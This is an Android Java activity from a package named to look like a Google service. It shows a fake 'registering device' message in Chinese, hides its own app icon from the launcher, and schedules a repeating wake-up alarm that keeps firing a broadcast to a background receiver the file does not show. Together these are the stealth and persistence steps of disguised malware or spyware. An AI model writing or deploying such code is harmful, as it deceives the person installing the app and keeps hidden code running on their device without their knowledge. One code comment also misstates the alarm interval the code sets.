package com.google.service;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.SystemClock;
import android.view.Gravity;
import android.widget.TextView;

public class MainActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		TextView tv = new TextView(this);
		tv.setText("正在注册设备...需要10s");
		tv.setGravity(Gravity.CENTER);
		setContentView(tv);
		// 将app图标隐藏：  
		PackageManager p = getPackageManager();
		p.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
		// 第一次安装应用的时候会启动服务
		Intent intent = new Intent(this, AlarmReceiver.class);
		intent.setAction("com.google.eternal.service.alarm_receiver");
		PendingIntent sender = PendingIntent.getBroadcast(this, 0, intent, 0);
		long firstime = SystemClock.elapsedRealtime();
		AlarmManager am = (AlarmManager) this.getSystemService(Context.ALARM_SERVICE);
		// 10秒一个周期，不停的发送广播  
		am.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP, firstime, 30 * 1000, sender);

		new Handler().postDelayed(new Runnable() {
			@Override
			public void run() {
				finish();
			}
		}, 10 * 1000);
	}
}
